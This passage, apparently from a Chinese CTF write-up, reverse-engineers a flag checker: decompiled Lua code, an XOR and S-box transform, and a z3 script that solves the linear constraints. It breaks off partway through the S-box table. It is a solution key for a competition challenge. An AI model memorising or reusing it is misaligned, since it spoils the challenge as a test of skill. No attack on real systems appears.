class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_impl</span><span class="params">()</span></span></span><br><span class="line">  <span class="keyword">local</span> note_id, L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2</span><br><span class="line">  note_id = <span class="number">0</span></span><br><span class="line">  L1_2 = <span class="number">0</span></span><br><span class="line">  L2_2 = <span class="string">&quot;&quot;</span></span><br><span class="line">  L3_2 = <span class="literal">false</span></span><br><span class="line">  <span class="keyword">while</span> note_id &lt; <span class="number">30</span> <span class="keyword">do</span></span><br><span class="line">    L4_2 = check_inuse_impl(note_id)</span><br><span class="line">    L5_2 = note_id % <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> L5_2 == <span class="number">0</span> <span class="keyword">and</span> L4_2 == <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">      L1_2 = L1_2 + <span class="number">1</span></span><br><span class="line">      L6_2 = note_id</span><br><span class="line">      L5_2 = read_data_impl(L6_2)</span><br><span class="line">      L6_2 = #L5_2</span><br><span class="line">      <span class="keyword">if</span> L6_2 ~= <span class="number">2</span> <span class="keyword">then</span></span><br><span class="line">        L3_2 = <span class="literal">true</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      L2_2 = L2_2 .. L5_2</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    note_id = note_id + <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">if</span> L1_2 == <span class="number">15</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> #L2_2 == <span class="number">30</span> <span class="keyword">and</span> L3_2 == <span class="literal">false</span> <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">if</span> check_func(L2_2) == <span class="literal">true</span> <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;now, you know the flag~&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(L2_2)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;you fail!&quot;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>check_func 初始化了一个长度为 256 的 s 盒，对每个字符异或特定值后进行置换，将结果数组传入 check_result_23_impl 进行检查：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_func</span><span class="params">(A0_2)</span></span></span><br><span class="line">  <span class="keyword">local</span> <span class="built_in">input</span>, tbl, sub_res</span><br><span class="line">  <span class="built_in">input</span> = value_list(A0_2)</span><br><span class="line">  sub_res = &#123;&#125;</span><br><span class="line">  tbl = &#123;&#125;</span><br><span class="line">  tbl[<span class="number">1</span>] = <span class="number">105</span></span><br><span class="line">  tbl[<span class="number">2</span>] = <span class="number">244</span></span><br><span class="line">  <span class="comment">-- ...</span></span><br><span class="line">  tbl[<span class="number">255</span>] = <span class="number">9</span></span><br><span class="line">  tbl[<span class="number">256</span>] = <span class="number">193</span></span><br><span class="line">  <span class="keyword">for</span> i = <span class="number">1</span>, #<span class="built_in">input</span>, <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">input</span>[i] = xor(<span class="built_in">input</span>[i], i - <span class="number">1</span>)</span><br><span class="line">    <span class="built_in">input</span>[i] = xor(<span class="built_in">input</span>[i], <span class="number">255</span>)</span><br><span class="line">    <span class="built_in">input</span>[i] = <span class="built_in">input</span>[i] &amp; <span class="number">255</span></span><br><span class="line">    sub_res[#sub_res + <span class="number">1</span>] = tbl[<span class="built_in">input</span>[i] + <span class="number">1</span>]</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> check_result_23_impl(sub_res) == <span class="number">1</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>check_result_23_impl 在 elf 中实现，其中实际调用 chk_23 来检查加密后的数组：</p><p><img src="/img/article/20221212/7.png" alt="picStore"></p><p>可以看出就是一连串的等式约束，写个 z3 脚本再解密回去即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line">a1 = [Int(<span class="string">f&#x27;c<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>)]</span><br><span class="line">v1 = a1[<span class="number">0</span>]</span><br><span class="line">v2 = a1[<span class="number">1</span>]</span><br><span class="line">v3 = a1[<span class="number">2</span>]</span><br><span class="line">v4 = a1[<span class="number">3</span>]</span><br><span class="line">v5 = a1[<span class="number">4</span>]</span><br><span class="line">v6 = a1[<span class="number">5</span>]</span><br><span class="line">v7 = a1[<span class="number">6</span>]</span><br><span class="line">v8 = a1[<span class="number">7</span>]</span><br><span class="line">v10 = a1[<span class="number">8</span>]</span><br><span class="line">v24 = a1[<span class="number">9</span>]</span><br><span class="line">v25 = a1[<span class="number">10</span>]</span><br><span class="line">v26 = a1[<span class="number">11</span>]</span><br><span class="line">v27 = a1[<span class="number">12</span>]</span><br><span class="line">v28 = a1[<span class="number">13</span>]</span><br><span class="line">v29 = a1[<span class="number">14</span>]</span><br><span class="line">v30 = a1[<span class="number">15</span>]</span><br><span class="line">v31 = a1[<span class="number">16</span>]</span><br><span class="line">v32 = a1[<span class="number">17</span>]</span><br><span class="line">v33 = a1[<span class="number">18</span>]</span><br><span class="line">v34 = a1[<span class="number">19</span>]</span><br><span class="line">v35 = a1[<span class="number">20</span>]</span><br><span class="line">v36 = a1[<span class="number">21</span>]</span><br><span class="line">v37 = a1[<span class="number">22</span>]</span><br><span class="line">v38 = a1[<span class="number">23</span>]</span><br><span class="line">v39 = a1[<span class="number">24</span>]</span><br><span class="line">v40 = a1[<span class="number">25</span>]</span><br><span class="line">v20 = a1[<span class="number">26</span>]</span><br><span class="line">v41 = a1[<span class="number">27</span>]</span><br><span class="line">v22 = a1[<span class="number">28</span>]</span><br><span class="line">solver.add(<span class="number">255036</span>*v7+-<span class="number">90989</span>*v3+-<span class="number">201344</span>*v4+<span class="number">122006</span>*v5+-<span class="number">140538</span>*v6+<span class="number">109859</span>*v2-<span class="number">109457</span>*v1-<span class="number">9396023</span> == <span class="number">0</span>)</span><br><span class="line">solver.add(<span class="number">277432</span>*v6+<span class="number">110191</span>*v3+-<span class="number">186022</span>*v4+<span class="number">175123</span>*v2-<span class="number">75564</span>*v5-<span class="number">252340</span>*v1-<span class="number">12226612</span> == <span class="number">0</span>)</span><br><span class="line">solver.add(<span class="number">127326</span>*v4+<span class="number">260948</span>*v2+-<span class="number">102835</span>*v1+<span class="number">225038</span>*v5-<span class="number">129683</span>*v3-<span class="number">45564209</span> == <span class="number">0</span>)</span><br><span class="line">solver.add(-<span class="number">170345</span>*v2+<span class="number">217412</span>*v3-<span class="number">26668</span>*v1+<span class="number">38500</span>*v4-<span class="number">27440782</span> == <span class="number">0</span>)</span><br><span class="line">solver.add(<span class="number">25295</span>*v2+<span class="number">69369</span>*v3+<span class="number">191287</span>*v1-<span class="number">24434293</span> == <span class="number">0</span>)</span><br><span class="line">solver.add(<span class="number">72265</span>*v1-<span class="number">2384745</span> == <span class="number">0</span>)</span><br><span class="line">solver.add(<span class="number">264694</span>*v1-<span class="number">190137</span>*v2+<span class="number">19025100</span> == <span class="number">0</span>)</span><br><span class="line">solver.add(<span class="number">101752</span>*v24+<span class="number">67154</span>*v8+-<span class="number">20311</span>*v1+-<span class="number">30496</span>*v6+-<span class="number">263329</span>*v7+-<span class="number">99420</span>*v10+<span class="number">255348</span>*v3+<span class="number">169511</span>*v4-<span class="number">121471</span>*v2+<span class="number">231370</span>*v5-<span class="number">33888892</span> == <span class="number">0</span>)</span><br><span class="line">solver.add(<span class="number">17253</span>*v8+-<span class="number">134891</span>*v7+<span class="number">144501</span>*v4+<span class="number">220594</span>*v2+<span class="number">263746</span>*v3+<span class="number">122495</span>*v6+<span class="number">74297</span>*v10+<span class="number">205480</span>*v1-<span class="number">32973</span>*v5-<span class="number">115484799</span> == <span class="number">0</span>)</span><br><span class="line">solver.add(<span class="number">251337</span>*v3+-<span class="number">198187</span>*v6+-<span class="number">217900</span>*v2+-<span class="number">62192</span>*v8+-<span class="number">138306</span>*v7+-<span class="number">165151</span>*v4-<span class="number">118227</span>*v1-<span class="number">22431</span>*v5+<span class="number">72699617</span> == <span class="number">0</span>)</span><br><span class="line">solver.add(<span class="number">243012</span>*v27+-<span class="number">233931</span>*v4+<span class="number">66595</span>*v7+-<span class="number">273948</span>*v5+-<span class="number">266708</span>*v24+<span class="number">75344</span>*v8-<span class="number">108115</span>*v3-<span class="number">17090</span>*v25+<span class="number">240281</span>*v10+<span class="number">202327</span>*v1-<span class="number">253495</span>*v2+<span class="number">233118</span>*v26+<span class="number">154680</span>*v6+<span class="number">25687761</span> == <span class="number">0</span>)</span><br><span class="line">solver.add(<span class="number">41011</span>*v8+-<span class="number">198187</span>*v1+-<span class="number">117171</span>*v7+-<span class="number">178912</span>*v3+<span class="number">9797</span>*v24+<span class="number">118730</span>*v10-<span class="number">193364</span>*v5-<span class="number">36072</span>*v6+<span class="number">10586</span>*v25-<span class="number">110560</span>*v4+<span class="number">173438</span>*v2-<span class="number">176575</span>*v26+<span class="number">54358815</span> == <span class="number">0</span>)</span><br><span class="line">solver.add(-<span class="number">250878</span>*v24+<span class="number">108430</span>*v1+-<span class="number">136296</span>*v5+<span class="number">11092</span>*v8+<span class="number">154243</span>*v7+-<span class="number">136624</span>*v3+<span class="number">179711</span>*v4+-<span class="number">128439</span>*v6+<span class="number">22681</span>*v25-<span class="number">42472</span>*v10-<span class="number">80061</span>*v2+<span class="number">34267161</span> == <span class="number">0</span>)  </span><br><span class="line">solver.add(<span class="number">65716</span>*v30+-<span class="number">18037</span>*v26+-<span class="number">42923</span>*v7+-<span class="number">33361</span>*v4+<span class="number">161566</span>*v6+<span class="number">194069</span>*v25+-<span class="number">154262</span>*v2+<span class="number">173240</span>*v3-<span class="number">31821</span>*v27-<span class="number">80881</span>*v5+<span class="number">217299</span>*v8-<span class="number">28162</span>*v10+<span class="number">192716</span>*v1+<span class="number">165565</span>*v24+<span class="number">106863</span>*v29-<span class="number">127658</span>*v28-<span class="number">75839517</span> == <span class="number">0</span>)</span><br><span class="line">solver.add(-<span class="number">236487</span>*v24+-<span class="number">45384</span>*v1+<span class="number">46984</span>*v26+<span class="number">148196</span>*v7+<span class="number">15692</span>*v8+-<span class="number">193664</span>*v6+<span class="number">6957</span>*v10+<span class="number">103351</span>*v29-<span class="number">217098</span>*v28+<span class="number">78149</span>*v4-<span class="number">237596</span>*v5-<span class="number">236117</span>*v3-<span class="number">142713</span>*v25+<span class="number">24413</span>*v27+<span class="number">232544</span>*v2+<span class="number">78860648</span> == <span class="number">0</span>)</span><br><span class="line">solver.add(-<span class="number">69129</span>*v10+-<span class="number">161882</span>*v3+-<span class="number">39324</span>*v26+<span class="number">106850</span>*v1+<span class="number">136394</span>*v5+<span class="number">129891</span>*v2+<span class="number">15216</span>*v27+<span class="number">213245</span>*v24-<span class="number">73770</span>*v28+<span class="number">24056</span>*v25-<span class="number">123372</span>*v8-<span class="number">38733</span>*v7-<span class="number">199547</span>*v4-<span class="number">10681</span>*v6+<span class="number">57424065</span> == <span class="number">0</span>)</span><br><span class="line">solver.add(-<span class="number">268870</span>*v30+<span class="number">103546</span>*v24+-<span class="number">124986</span>*v27+<span class="number">42015</span>*v7+<span class="number">80222</span>*v2+-<span class="number">77247</span>*v10+-<span class="number">8838</span>*v25+-<span class="number">273842</span>*v4+-<span class="number">240751</span>*v28-<span class="number">187146</span>*v26-<span class="number">150301</span>*v6-<span class="number">167844</span>*v3+<span class="number">92327</span>*v8+<span class="number">270212</span>*v5-<span class="number">87705</span>*v33-<span class="number">216624</span>*v1+<span class="number">35317</span>*v31+<span class="number">231278</span>*v32-<span class="number">213030</span>*v29+<span class="number">114317949</span> == <span class="number">0</span>)</span><br><span class="line">solver.add(-<span class="number">207225</span>*v1+-<span class="number">202035</span>*v3+<span class="number">81860</span>*v27+-<span class="number">114137</span>*v5+<span class="number">265497</span>*v30+-<span class="number">216722</span>*v8+<span class="number">276415</span>*v28+-<span class="number">201420</span>*v10-<span class="number">266588</span>*v32+<span class="number">174412</span>*v6+<span class="number">249222</span>*v24-<span class="number">191870</span>*v4+<span class="number">100486</span>*v2+<span class="number">37951</span>*v25+<span class="number">67406</span>*v26+<span class="number">55224</span>*v31+<span class="number">101345</span>*v7-<span class="number">76961</span>*v29+<span class="number">33370551</span> == <span class="number">0</span>)</span><br><span class="line">solver.add(<span class="number">175180</span>*v29+<span class="number">25590</span>*v4+-<span class="number">35354</span>*v30+-<span class="number">173039</span>*v31+<span class="number">145220</span>*v25+<span class="number">6521</span>*v7+<span class="number">99204</span>*v24+<span class="number">72076</span>*v27+<span class="number">207349</span>*v2+<span class="number">123988</span>*v5-<span class="number">64247</span>*v8+<span class="number">169099</span>*v6-<span class="number">54799</span>*v3+<span class="number">53935</span>*v1-<span class="number">223317</span>*v26+<span class="number">215925</span>*v10-<span class="number">119961</span>*v28-<span class="number">83559622</span> == <span class="number">0</span>)</span><br><span class="line">solver.add(<span class="number">43170</span>*v3+-<span class="number">145060</span>*v2+<span class="number">199653</span>*v6+<span class="number">14728</span>*v30+<span class="number">139827</span>*v24+<span class="number">59597</span>*v29+<span class="number">2862</span>*v10+-<span class="number">171413</span>*v31+-<span class="number">15355</span>*v25-<span class="number">71692</span>*v7-<span class="number">16706</span>*v26+<span class="number">264615</span>*v1-<span class="number">149167</span>*v33+<span class="number">75391</span>*v27-<span class="number">2927</span>*v4-<span class="number">187387</span>*v5-<span class="number">190782</span>*v8-<span class="number">150865</span>*v28+<span class="number">44238</span>*v32-<span class="number">276353</span>*v34+<span class="number">82818982</span> == <span class="number">0</span>)</span><br><span class="line">solver.add(-<span class="number">3256</span>*v27+-<span class="number">232013</span>*v25+-<span class="number">261919</span>*v29+-<span class="number">151844</span>*v26+<span class="number">11405</span>*v4+<span class="number">159913</span>*v32+<span class="number">209002</span>*v7+<span class="number">91932</span>*v34+<span class="number">270180</span>*v10+-<span class="number">195866</span>*v3-<span class="number">135274</span>*v33-<span class="number">261245</span>*v1+<span class="number">24783</span>*v35+<span class="number">262729</span>*v8-<span class="number">81293</span>*v24-<span class="number">156714</span>*v2-<span class="number">93376</span>*v28-<span class="number">163223</span>*v31-<span class="number">144746</span>*v5+<span class="number">167939</span>*v6-<span class="number">120753</span>*v30-<span class="number">13188886</span> == <span class="number">0</span>)</span><br><span class="line">solver.add(-<span class="number">240655</span>*v35+<span class="number">103437</span>*v30+<span class="number">236610</span>*v27+<span class="number">100948</span>*v8+<span class="number">82212</span>*v6+-<span class="number">60676</span>*v5+-<span class="number">71032</span>*v3+<span class="number">259181</span>*v7+<span class="number">100184</span>*v10+<span class="number">7797</span>*v29+<span class="number">143350</span>*v24+<span class="number">76697</span>*v2-<span class="number">172373</span>*v25-<span class="number">110023</span>*v37-<span class="number">13673</span>*v4+<span class="number">129100</span>*v31+<span class="number">86759</span>*v1-<span class="number">101103</span>*v33-<span class="number">142195</span>*v36+<span class="number">28466</span>*v32-<span class="number">27211</span>*v26-<span class="number">269662</span>*v34+<span class="number">9103</span>*v28-<span class="number">96428951</span> == <span class="number">0</span>)</span><br><span class="line">solver.add(-<span class="number">92750</span>*v28+-<span class="number">151740</span>*v27+<span class="number">15816</span>*v35+<span class="number">186592</span>*v24+-<span class="number">156340</span>*v29+-<span class="number">193697</span>*v2+-<span class="number">108622</span>*v8+-<span class="number">163956</span>*v5+<span class="number">78044</span>*v4+-<span class="number">280132</span>*v36-<span class="number">73939</span>*v33-<span class="number">216186</span>*v3+<span class="number">168898</span>*v30+<span class="number">81148</span>*v34-<span class="number">200942</span>*v32+<span class="number">1920</span>*v1+<span class="number">131017</span>*v26-<span class="number">229175</span>*v10-<span class="number">247717</span>*v31+<span class="number">232852</span>*v25+<span class="number">25882</span>*v7+<span class="number">144500</span>*v6+<span class="number">175681562</span> == <span class="number">0</span>)</span><br><span class="line">solver.add(<span class="number">234452</span>*v34+-<span class="number">23111</span>*v29+-<span class="number">40957</span>*v2+-<span class="number">147076</span>*v8+<span class="number">16151</span>*v32+-<span class="number">250947</span>*v35+-<span class="number">111913</span>*v30+-<span class="number">233475</span>*v24+-<span class="number">2485</span>*v28+<span class="number">207006</span>*v26+<span class="number">71474</span>*v3+<span class="number">78521</span>*v1-<span class="number">37235</span>*v36+<span class="number">203147</span>*v5+<span class="number">159297</span>*v7-<span class="number">227257</span>*v38+<span class="number">141894</span>*v25-<span class="number">238939</span>*v10-<span class="number">207324</span>*v37-<span class="number">168960</span>*v33+<span class="number">212325</span>*v6+<span class="number">152097</span>*v31-<span class="number">94775</span>*v27+<span class="number">197514</span>*v4+<span class="number">62343322</span> == <span class="number">0</span>) </span><br><span class="line">solver.add(-<span class="number">142909</span>*v34+-<span class="number">111865</span>*v31+<span class="number">258666</span>*v36+-<span class="number">66780</span>*v2+-<span class="number">13109</span>*v35+-<span class="number">72310</span>*v25+-<span class="number">278193</span>*v26+-<span class="number">219709</span>*v24+<span class="number">40855</span>*v8+-<span class="number">270578</span>*v38+<span class="number">96496</span>*v5+-<span class="number">4530</span>*v1+<span class="number">63129</span>*v28-<span class="number">4681</span>*v7-<span class="number">272799</span>*v30-<span class="number">225257</span>*v10+<span class="number">128712</span>*v37-<span class="number">201687</span>*v39+<span class="number">273784</span>*v3+<span class="number">141128</span>*v29+<span class="number">93283</span>*v32+<span class="number">128210</span>*v33+<span class="number">47550</span>*v6-<span class="number">84027</span>*v4+<span class="number">52764</span>*v40-<span class="number">140487</span>*v27+<span class="number">105279220</span> == <span class="number">0</span>)</span><br><span class="line">solver.add(<span class="number">216020</span>*v38+-<span class="number">248561</span>*v29+-<span class="number">86516</span>*v33+<span class="number">237852</span>*v26+-<span class="number">132193</span>*v31+-<span class="number">101471</span>*v3+<span class="number">87552</span>*v25+-<span class="number">122710</span>*v8+<span class="number">234681</span>*v5+-<span class="number">24880</span>*v7+-<span class="number">245370</span>*v1+-<span class="number">17836</span>*v36-<span class="number">225714</span>*v34-<span class="number">256029</span>*v4+<span class="number">171199</span>*v35+<span class="number">266838</span>*v10-<span class="number">32125</span>*v24-<span class="number">43141</span>*v32-<span class="number">87051</span>*v30-<span class="number">68893</span>*v39-<span class="number">242483</span>*v28-<span class="number">12823</span>*v2-<span class="number">159262</span>*v27+<span class="number">123816</span>*v37-<span class="number">180694</span>*v6+<span class="number">152819799</span> == <span class="number">0</span>)</span><br><span class="line">solver.add(-<span class="number">116890</span>*v3+<span class="number">67983</span>*v27+-<span class="number">131934</span>*v4+<span class="number">256114</span>*v40+<span class="number">128119</span>*v24+<span class="number">48593</span>*v33+-<span class="number">41706</span>*v2+-<span class="number">217503</span>*v26+<span class="number">49328</span>*v6+<span class="number">223466</span>*v7+-<span class="number">31184</span>*v5+-<span class="number">208422</span>*v36+<span class="number">261920</span>*v1+<span class="number">83055</span>*v20+<span class="number">115813</span>*v37+<span class="number">174499</span>*v29-<span class="number">188513</span>*v35+<span class="number">18957</span>*v25+<span class="number">15794</span>*v10-<span class="number">2906</span>*v28-<span class="number">25315</span>*v8+<span class="number">232180</span>*v32-<span class="number">102442</span>*v39-<span class="number">116930</span>*v34-<span class="number">192552</span>*v38-<span class="number">179822</span>*v31+<span class="number">265749</span>*v30-<span class="number">54143007</span> == <span class="number">0</span>)</span><br><span class="line">solver.add(-<span class="number">215996</span>*v4+-<span class="number">100890</span>*v40+-<span class="number">177349</span>*v7+-<span class="number">159264</span>*v6+-<span class="number">227328</span>*v27+-<span class="number">91901</span>*v24+-<span class="number">28939</span>*v10+<span class="number">206392</span>*v41+<span class="number">6473</span>*v25+-<span class="number">22051</span>*v20+-<span class="number">112044</span>*v34+-<span class="number">119414</span>*v30+-<span class="number">225267</span>*v35+<span class="number">223380</span>*v3+<span class="number">275172</span>*v5+<span class="number">95718</span>*v39-<span class="number">115127</span>*v29+<span class="number">85928</span>*v26+<span class="number">169057</span>*v38-<span class="number">204729</span>*v1+<span class="number">178788</span>*v36-<span class="number">85503</span>*v31-<span class="number">121684</span>*v2-<span class="number">18727</span>*v32+<span class="number">109947</span>*v33-<span class="number">138204</span>*v8-<span class="number">245035</span>*v28+<span class="number">134266</span>*v37+<span class="number">110228962</span> == <span class="number">0</span>)</span><br><span class="line">solver.add(-<span class="number">165644</span>*v32+<span class="number">4586</span>*v39+<span class="number">138195</span>*v25+<span class="number">155259</span>*v35+-<span class="number">185091</span>*v3+-<span class="number">63869</span>*v31+-<span class="number">23462</span>*v30+<span class="number">150939</span>*v41+-<span class="number">217079</span>*v8+-<span class="number">122286</span>*v6+<span class="number">5460</span>*v38+-<span class="number">235719</span>*v7+<span class="number">270987</span>*v26+<span class="number">157806</span>*v34+<span class="number">262004</span>*v29-<span class="number">2963</span>*v28-<span class="number">159217</span>*v10+<span class="number">266021</span>*v33-<span class="number">190702</span>*v24-<span class="number">38473</span>*v20+<span class="number">122617</span>*v2+<span class="number">202211</span>*v36-<span class="number">143491</span>*v27-<span class="number">251332</span>*v4+<span class="number">196932</span>*v5-<span class="number">155172</span>*v22+<span class="number">209759</span>*v40-<span class="number">146511</span>*v1+<span class="number">62542</span>*v37+<span class="number">185928391</span> == <span class="number">0</span>)</span><br><span class="line">solver.add(<span class="number">57177</span>*v24+<span class="number">242367</span>*v39+<span class="number">226332</span>*v31+<span class="number">15582</span>*v26+<span class="number">159461</span>*v34+-<span class="number">260455</span>*v22+-<span class="number">179161</span>*v37+-<span class="number">251786</span>*v32+-<span class="number">66932</span>*v41+<span class="number">134581</span>*v1+-<span class="number">65235</span>*v29+-<span class="number">110258</span>*v28+<span class="number">188353</span>*v38+-<span class="number">108556</span>*v6+<span class="number">178750</span>*v40+-<span class="number">20482</span>*v25+<span class="number">127145</span>*v8+-<span class="number">203851</span>*v5+-<span class="number">263419</span>*v10+<span class="number">245204</span>*v33+-<span class="number">62740</span>*v20+<span class="number">103075</span>*v2-<span class="number">229292</span>*v36+<span class="number">142850</span>*v30-<span class="number">1027</span>*v27+<span class="number">264120</span>*v3+<span class="number">264348</span>*v4-<span class="number">41667</span>*v35+<span class="number">130195</span>*v7+<span class="number">127279</span>*a1[<span class="number">29</span>]-<span class="number">51967523</span> == <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">cipher = []</span><br><span class="line"><span class="keyword">if</span> solver.check() == z3.sat:</span><br><span class="line">    m = solver.model()</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> a1:</span><br><span class="line">        cipher.append(m[c].as_long())</span><br><span class="line"></span><br><span class="line">    tbl = [<span class="number">105</span>, <span class="number">244</span>, <span class="number">63</span>, <span class="number">10</span>, <span class="number">24</span>, <span class="number">169</span>, <span class="number">248</span>, <span class="number">107</span>, <span class="number">129</span>, <span class="number">138</span>, <span class="number">25</span>, <span class="number">182</span>, <span class="number">96</span>, <span class="number">176</span>, <span class="number">14</span>, <span class="number">89</span>, <span class="number">56</span>, <span class="number">229</span>, <span class="number">206</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">198</span>, <span class="number">179</span>, <span class="number">167</span>, <span class="number">152</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">201</span>, <span class="number">213</span>, <span class="number">80</span>, <span class="number">162</span>, <span class="number">151</span>, <span class="number">102</span>, <span class="number">36</span>, <span class="number">91</span>, <span class="number">37</span>, <span class="number">50</span>, <span class="number">17</span>, <span class="number">170</span>, <span class="number">41</span>, <span class="number">3</span>, <span class="number">84</span>, <span class="number">85</span>, <span class="number">226</span>, <span class="number">131</span>, <span class="number">38</span>, <span class="number">71</span>, <span class="number">32</span>, <span class="number">18</span>, <span class="number">142</span>, <span class="number">70</span>, <span class="number">39</span>, <span class="number">112</span>, <span class="number">220</span>, <span class="number">16</span>, <span class="number">219</span>, <span class="number">159</span>, <span class="number">222</span>, <span class="number">11</span>, <span class="number">119</span>, <span class="number">99</span>, <span class="number">203</span>, <span class="number">47</span>, <span class="number">148</span>, <span class="number">185</span>, <span class="number">55</span>, <span class="number">93</span>, <span class="number">48</span>, <span class="number">153</span>, <span class="number">113</span>, <span class="number">1</span>, <span class="number">237</span>, <span class="number">35</span>, <span class="number">75</span>, <span class="number">67</span>, <span class="number">155</span>, <span class="number">161</span>, <span class="number">74</span>, <span class="number">108</span>, <span class="number">76</span>, <span class="number">181</span>, <span class="number">233</span>, <span class="number">186</span>, <span class="number">44</span>, <span class="number">125</span>, <span class="number">232</span>, <span class="number">88</span>, <span class="number">8</span>, <span class="number">95</span>, <span class="number">163</span>, <span class="number">200</span>, <span class="number">249</span>, <span class="number">120</span>, <span class="number">243</span>, <span class="number">174</span>, <span class="number">212</span>, <span class="number">252</span>, <span class="number">234</span>, <span class="number">58</span>, <span class="number">101</span>, <span class="number">228</span>, <span class="number">86</span>, <span class="number">109</span>, <span class="number">144</span>, <span class="number">104</span>, <span class="number">121</span>, <span class="number">117</span>, <span class="number">87</span>, <span class="number">15</span>, <span class="number">132</span>, <span class="number">12</span>, <span class="number">20</span>, <span class="number">165</span>, <span class="number">115</span>, <span class="number">136</span>, <span class="number">135</span>, <span class="number">118</span>, <span class="number">69</span>, <span class="number">68</span>, <span class="number">2</span>, <span class="number">82</span>, <span class="number">123</span>, <span class="number">250</span>, <span class="number">251</span>, <span class="number">53</span>, <span class="number">255</span>, <span class="number">51</span>, <span class="number">221</span>, <span class="number">211</span>, <span class="number">195</span>, <span class="number">145</span>, <span class="number">140</span>, <span class="number">254</span>, <span class="number">0</span>, <span class="number">116</span>, <span class="number">43</span>, <span class="number">29</span>, <span class="number">217</span>, <span class="number">197</span>, <span class="number">183</span>, <span class="number">168</span>, <span class="number">188</span>, <span class="number">34</span>, <span class="number">218</span>, <span class="number">146</span>, <span class="number">147</span>, <span class="number">98</span>, <span class="number">149</span>, <span class="number">246</span>, <span class="number">180</span>, <span class="number">103</span>, <span class="number">33</span>, <span class="number">40</span>, <span class="number">207</span>, <span class="number">208</span>, <span class="number">192</span>, <span class="number">143</span>, <span class="number">26</span>, <span class="number">154</span>, <span class="number">225</span>, <span class="number">100</span>, <span class="number">141</span>, <span class="number">175</span>, <span class="number">124</span>, <span class="number">230</span>, <span class="number">62</span>, <span class="number">177</span>, <span class="number">205</span>, <span class="number">110</span>, <span class="number">202</span>, <span class="number">253</span>, <span class="number">173</span>, <span class="number">46</span>, <span class="number">52</span>, <span class="number">114</span>, <span class="number">164</span>, <span class="number">166</span>, <span class="number">137</span>, <span class="number">158</span>, <span class="number">122</span>, <span class="number">13</span>, <span class="number">83</span>, <span class="number">178</span>, <span class="number">133</span>, <span class="number">189</span>, <span class="number">187</span>, <span class="number">7</span>, <span class="number">184</span>, <span class="number">77</span>, <span class="number">245</span>, <span class="number">216</span>, <span class="number">190</span>, <span class="number">194</span>, <span class="number">72</span>, <span class="number">157</span>, <span class="number">172</span>, <span class="number">171</span>, <span class="number">199</span>, <span class="number">160</span>, <span class="number">45</span>, <span class="number">49</span>, <span class="number">27</span>, <span class="number">204</span>, <span class="number">81</span>, <span class="number">6</span>, <span class="number">92</span>, <span class="number">59</span>, <span class="number">209</span>, 